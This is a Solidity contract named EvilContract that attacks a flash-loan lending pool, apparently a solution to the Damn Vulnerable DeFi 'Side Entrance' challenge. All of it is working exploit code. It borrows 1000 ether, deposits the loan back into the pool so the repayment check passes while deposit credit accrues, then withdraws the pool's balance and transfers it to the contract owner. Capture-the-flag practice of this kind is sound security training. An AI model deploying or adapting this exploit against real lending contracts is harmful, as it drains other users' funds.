// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

contract EvilContract {
    using Address for address payable;

    SideEntranceLenderPool pool;
    address payable owner;

    constructor(address payable poolAddress) {
        owner = payable(msg.sender);
        pool = SideEntranceLenderPool(poolAddress);
    }

    function interact() public payable {
        pool.flashLoan(1000 ether);
    }

    function takeFunds() public {
        pool.withdraw();
        owner.transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    receive() external payable {}
}
 